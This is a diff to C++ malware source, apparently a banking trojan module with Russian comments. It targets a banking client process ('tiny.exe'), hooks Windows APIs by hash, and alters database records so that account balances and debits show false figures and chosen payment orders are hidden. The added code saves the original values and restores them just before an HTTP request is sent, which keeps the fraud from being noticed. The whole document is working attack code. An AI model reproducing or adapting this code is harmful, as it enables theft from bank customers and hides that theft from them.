@@ -36,8 +36,10 @@ struct RestAccount
 {
 	char account[32]; //если account[0] = 0, то конец массива
 	TIMESTAMP_STRUCT date; //после какой даты
-	DWORD sum; //какой остаток нужно подставить
-	DWORD debet; //сумма дебета (расхода) в указанный день
+	__int64 sum; //какой остаток нужно подставить
+	__int64 debet; //сумма дебета (расхода) в указанный день
+	__int64 oldSum; //какой остаток был до подмены
+	__int64 oldDebet; //какой был дебет до подмены
 };
 
 //скрываемые платежки
@@ -45,13 +47,15 @@ struct HidePayment
 {
 	char account[32];
 	char num[32]; //номер документа
-	DWORD amount; //сумма
+	__int64 amount; //сумма
 	TIMESTAMP_STRUCT date; //дата платежки
+	int orgDate, dayDate, payDate; //даты до скрытия
 };
 
 static RestAccount restAccounts[10]; //подмена баланса
 static HidePayment hidePayments[10]; //скрываемые платежки
 static bool runHideReplacement = false; //true - если надо провести подмену скрытие
+static bool replacementDone = false; //true если подмена была совершена
 
 const int PROCESS_HASH = 0x9530DB12; // tiny.exe
 const DWORD HashTfAuthNew = 0x19DEB558; //класс окна входа в систему
@@ -163,6 +167,8 @@ typedef HRESULT (__stdcall *type_get_Type)( void* This, enum DataTypeEnum * pDat
 typedef HRESULT (__stdcall *type_get_Value)( void* This, VARIANT * pvar );
 
 static BOOL (WINAPI *RealDestroyWindow)( HWND hWnd );
+static BOOL (WINAPI *RealConnect)( SOCKET s, const struct sockaddr *name, int namelen );
+static BOOL (WINAPI *RealHttpSendRequestA)( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength );
 static HRESULT (STDAPICALLTYPE *RealCoCreateInstance)( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv );
 //перехват вызова функций в интерфейсах ADO
 static HRESULT (__stdcall *RealConnection_Open)( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options );
@@ -176,6 +182,8 @@ static bool InitData();
 static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void** realFuncs, int count );
 //поток подмены баланса и скрытия платежек
 static DWORD WINAPI ThreadHideReplacement(void*);
+//восстановить баланс и скрываемую платежку
+static void RestoreBalansAndDocs();
 
 static void CloseDB( ODBC* DB )
 {
@@ -501,6 +509,24 @@ static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
 	return RealDestroyWindow(hwnd);
 }
 
+static int WINAPI HandlerConnect( SOCKET s, const struct sockaddr *name, int namelen )
+{
+	DBG( "Tiny", "Connect()" );
+	return RealConnect( s, name, namelen );
+}
+
+static BOOL WINAPI HandlerHttpSendRequestA( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength )
+{
+	DBG( "Tiny", "HandlerHttpSendRequestA()" );
+	if( replacementDone )
+	{
+		RestoreBalansAndDocs();
+		replacementDone = false;
+	}
+	return RealHttpSendRequestA( hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength );
+}
+
+
 static char* ToHex( char* s, const BYTE* p, int c_p )
 {
 	fwsprintfA pwsprintfA = Get_wsprintfA();
@@ -796,6 +822,14 @@ static bool SetHooks()
 	{
 		DBG( "Tiny", "установили хук на DestroyWindow" );
 	}
+//	if( HookApi( DLL_WINSOCK, 0xEDD8FE8A, &HandlerConnect, &RealConnect ) )
+//	{
+//		DBG( "Tiny", "установили хук на Conenct" );
+//	}
+	if( HookApi( DLL_WININET, 0x9F13856A, &HandlerHttpSendRequestA, &RealHttpSendRequestA ) )
+	{
+		DBG( "Tiny", "установили хук на HttpSendRequest" );
+	}
 	return true;
 }
 
@@ -933,9 +967,9 @@ static void FV_FullName_Amounts( VARIANT* v )
 
 //переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
 //не может быть в числе, в len будет количество прочитанных символов (символов в числе)
-static int SumToInt( const char* s, int* len )
+static __int64 SumToInt( const char* s, int* len )
 {
-	int v = 0;
+	__int64 v = 0;
 	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
 	const char* p = s;
 	while( *s == ' ' ) s++;
@@ -1068,12 +1102,27 @@ static void ReadReplacement( const char* s )
 {
 	//чтение остатка
 	int n = 0;
+	DWORD size;
+	RestAccount* restAccounts2 = (RestAccount*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyOldBalans).t_str() ).t_str(), size );
+	m_memset( &restAccounts, 0, sizeof(restAccounts) );
 	while( *s )
 	{
 		//считываем счет
 		char account[32];
 		s += ReadString( s, account );
 		ConvertAccount( account, restAccounts[n].account );
+		//ищем указанный счет и забираем суммы до подмены
+		int i = 0;
+		while( restAccounts2[i].account[0] )
+		{
+			if( m_lstrcmp( restAccounts[n].account, restAccounts2[i].account ) == 0 )
+			{
+				restAccounts[n].oldSum = restAccounts2[i].oldSum;
+				restAccounts[n].oldDebet = restAccounts2[i].oldDebet;
+				break;
+			}
+			i++;
+		}
 		//сумма
 		int len;
 		restAccounts[n].sum = SumToInt( s, &len );
@@ -1082,14 +1131,17 @@ static void ReadReplacement( const char* s )
 		s += len;
 		//дата
 		s += ReadDate( s, &restAccounts[n].date );
-		DBG( "Tiny", "Загрузили подмену баланса для счета: %s, остаток: %d, дебет: %d", restAccounts[n].account, restAccounts[n].sum, restAccounts[n].debet );
+		DBG( "Tiny", "Загрузили подмену баланса для счета: %s, остаток: %I64d, дебет: %I64d", restAccounts[n].account, restAccounts[n].sum, restAccounts[n].debet );
 		DBG( "Tiny", "Дата %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
 		while( *s == ' ' ) s++;
 		n++;
 		if( n >= ARRAYSIZE(restAccounts) - 1 ) break;
 		if( *s++ == ';' ) break;
 	}
-	restAccounts[n].account[0] = 0; //конец массива
+	MemFree(restAccounts2);
+
+	m_memset( &hidePayments, 0, sizeof(hidePayments) ); 
+	HidePayment* hidePayments2 = (HidePayment*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyOldDocs).t_str() ).t_str(), size );
 	n = 0;
 	while( *s )
 	{
@@ -1097,6 +1149,19 @@ static void ReadReplacement( const char* s )
 		char account[32];
 		s += ReadString( s, account );
 		ConvertAccount( account, hidePayments[n].account );
+		//ищем указанный счет и забираем даты до скрытия
+		int i = 0;
+		while( hidePayments[i].account[0] )
+		{
+			if( m_lstrcmp( hidePayments[n].account, hidePayments2[i].account ) == 0 )
+			{
+				hidePayments[n].orgDate = hidePayments2[i].orgDate;
+				hidePayments[n].dayDate = hidePayments2[i].dayDate;
+				hidePayments[n].payDate = hidePayments2[i].payDate;
+				break;
+			}
+			i++;
+		}
 		//номер платежки
 		s += ReadString( s, hidePayments[n].num );
 		s += ReadDate( s, &hidePayments[n].date );
@@ -1107,7 +1172,7 @@ static void ReadReplacement( const char* s )
 		if( *s == 0 || n >= ARRAYSIZE(hidePayments) - 1 ) break;
 		s++;
 	}
-	hidePayments[n].account[0] = 0; //конец массива
+	MemFree(hidePayments2);
 }
 
 //конвертирует дату в целое число посредством запроса в базу данных, в клиенте
@@ -1134,24 +1199,53 @@ static void ReplacementBalance()
 		fwsprintfA pwsprintfA = Get_wsprintfA();
 		while( restAccounts[n].account[0] )
 		{
-			DBG( "Tiny", "Для счета %s ставим баланс %d", restAccounts[n].account, restAccounts[n].sum );
-			sql = "update Amounts set Expected=%d.%02d,Confirmed=%d.%d where Code='%s'";
-			DWORD v = restAccounts[n].sum;
-			pwsprintfA( sqlBuf.AsStr(), sql, v / 100, v % 100, v / 100, v % 100, restAccounts[n].account );
-			DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
-			SQLHSTMT qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
-			DB->CloseQuery(qr);
-			DBG( "Tiny", "Для счета %s ставим дебет %d", restAccounts[n].account, restAccounts[n].debet );
+			DBG( "Tiny", "Для счета %s ставим баланс %I64d", restAccounts[n].account, restAccounts[n].sum );
+			//смотрим какой текущий баланс 
+			char SUM[32];
+			sql = "select Expected from Amounts where Code=?";
+			SQLHSTMT qr = DB->ExecuteSql( sql, "os31 is31", SUM, restAccounts[n].account );
+			if( qr )
+			{
+				DB->CloseQuery(qr);
+				__int64 sum = SumToInt( SUM, 0 );
+				DBG( "Tiny", "Текущий баланс %I64d", sum );
+				__int64 v = restAccounts[n].sum;
+				if( sum != v ) //еще не было подмены или затерли нашу подмену
+				{
+					sql = "update Amounts set Expected=%d.%02d,Confirmed=%d.%d where Code='%s'";
+					pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account );
+					DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
+					qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
+					DB->CloseQuery(qr);
+					restAccounts[n].oldSum = sum;
+				}
+			}
+
+			DBG( "Tiny", "Для счета %s ставим дебет %I64d", restAccounts[n].account, restAccounts[n].debet );
 			int DayDate = ConvertDate( DB, &restAccounts[n].date );
-			v = restAccounts[n].debet;
-			sql = "update Turns set ConDebit=%d.%02d where Code='%s' and DayDate=%d";
-			pwsprintfA( sqlBuf.AsStr(), sql, v / 100, v % 100, restAccounts[n].account, DayDate );
-			DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
-			qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
-			DB->CloseQuery(qr);
+			//извлекаем текущее значение дебета (сумму расхода за день)
+			sql = "select ConDebit from Turns where Code=? and DayDate=?";
+			qr = DB->ExecuteSql( sql, "os31 is31", SUM, restAccounts[n].account, &DayDate );
+			if( qr )
+			{
+				DB->CloseQuery(qr);
+				__int64 sum = SumToInt( SUM, 0 );
+				DBG( "Tiny", "Текущий дебет %I64d", sum );
+				__int64 v = restAccounts[n].debet;
+				if( sum != v )
+				{
+					sql = "update Turns set ConDebit=%d.%02d where Code='%s' and DayDate=%d";
+					pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account, DayDate );
+					DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
+					qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
+					DB->CloseQuery(qr);
+					restAccounts[n].oldDebet = sum;
+				}
+			}
 			n++;
 		}
 		CloseDB(DB);
+		File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyOldBalans).t_str() ).t_str(), &restAccounts, sizeof(restAccounts) );
 	}
 }
 
@@ -1179,15 +1273,101 @@ static void HidePayments()
 				endDay.hour = 23;
 				endDay.minute = 59;
 				endDay.second = 59;
-				sql = "update Documents set OrgDate=?, DayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
-				qr = DB->ExecuteSql( sql, "ii ii is24 it it is31", &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
-				DB->CloseQuery(qr);
-				sql = "update MyDocuments set OrgDate=?, DayDate=?, PayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
-				qr = DB->ExecuteSql( sql, "ii ii ii is24 it it is31", &dateFirst, &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
-				DB->CloseQuery(qr);
+				int OrgDate, DayDate, PayDate;
+				sql = "select OrgDate, DayDate from Documents where DebitInit=? and Created>=? and Created<=? and Code=?";
+				qr = DB->ExecuteSql( sql, "oi oi is24 it it is31", &OrgDate, &DayDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+				if( qr )
+				{
+					DBG( "Tiny", "1" );
+					DB->CloseQuery(qr);
+					if( OrgDate != dateFirst )
+					{
+						DBG( "Tiny", "2" );
+						sql = "update Documents set OrgDate=?, DayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+						qr = DB->ExecuteSql( sql, "ii ii is24 it it is31", &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+						DB->CloseQuery(qr);
+						hidePayments[n].orgDate = OrgDate;
+						hidePayments[n].dayDate = DayDate;
+					}
+				}
+
+				sql = "select OrgDate,DayDate,PayDate from MyDocuments where DebitInit=? and Created>=? and Created<=? and Code=?";
+				qr = DB->ExecuteSql( sql, "oi oi oi is24 it it is31", &OrgDate, &DayDate, &PayDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+				if( qr )
+				{
+					DB->CloseQuery(qr);
+					if( OrgDate != dateFirst )
+					{
+						sql = "update MyDocuments set OrgDate=?, DayDate=?, PayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+						qr = DB->ExecuteSql( sql, "ii ii ii is24 it it is31", &dateFirst, &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+						DB->CloseQuery(qr);
+						hidePayments[n].orgDate = OrgDate;
+						hidePayments[n].dayDate = DayDate;
+						hidePayments[n].payDate = PayDate;
+					}
+				}
 				n++;
 			}
 		}
+		CloseDB(DB);
+		File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyOldDocs).t_str() ).t_str(), &hidePayments, sizeof(hidePayments) );
+	}
+}
+
+//восстановить баланс и скрываемую платежку
+static void RestoreBalansAndDocs()
+{
+	ODBC* DB = OpenDB();
+	if( DB )
+	{
+		TMemory sqlBuf(1024);
+		const char* sql;
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+
+		DBG( "Tiny", "Восстаналиваем баланс" );
+		int n = 0;
+		while( restAccounts[n].account[0] )
+		{
+			DBG( "Tiny", "Для счета %s восстанавливаем баланс %I64d", restAccounts[n].account, restAccounts[n].oldSum );
+			sql = "update Amounts set Expected=%d.%02d,Confirmed=%d.%d where Code='%s'";
+			__int64 v = restAccounts[n].oldSum;
+			pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account );
+			DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
+			SQLHSTMT qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
+			DB->CloseQuery(qr);
+
+			DBG( "Tiny", "Для счета %s восстанавливаем дебет %I64d", restAccounts[n].account, restAccounts[n].oldDebet );
+			int DayDate = ConvertDate( DB, &restAccounts[n].date );
+			sql = "update Turns set ConDebit=%d.%02d where Code='%s' and DayDate=%d";
+			v = restAccounts[n].oldDebet;
+			pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account, DayDate );
+			DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
+			qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
+			DB->CloseQuery(qr);
+			n++;
+		}
+
+		DBG( "Tiny", "Восстанавляваем скрытую платежку" );
+		n = 0;
+		while( hidePayments[n].account[0] )
+		{
+			DBG( "Tiny", "Восстанвливаем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
+			TIMESTAMP_STRUCT endDay; //конец дня, для выбора платежки за определенный день
+			m_memcpy( &endDay, &hidePayments[n].date, sizeof(endDay) );
+			endDay.hour = 23;
+			endDay.minute = 59;
+			endDay.second = 59;
+
+			sql = "update Documents set OrgDate=?, DayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+			SQLHSTMT qr = DB->ExecuteSql( sql, "ii ii is24 it it is31", &hidePayments[n].orgDate, &hidePayments[n].dayDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+			DB->CloseQuery(qr);
+
+			sql = "update MyDocuments set OrgDate=?, DayDate=?, PayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+			qr = DB->ExecuteSql( sql, "ii ii ii is24 it it is31", &hidePayments[n].orgDate, &hidePayments[n].dayDate, &hidePayments[n].payDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+			DB->CloseQuery(qr);
+			n++;
+		}
+
 		CloseDB(DB);
 	}
 }
@@ -1222,6 +1402,7 @@ static DWORD WINAPI ThreadHideReplacement(void*)
 		ReplacementBalance();
 		HidePayments();
 		runHideReplacement = false;
+		replacementDone = true;
 		for(;;)
 		{
 			if( File::IsExists( fileFlag.t_str() ) ) break;
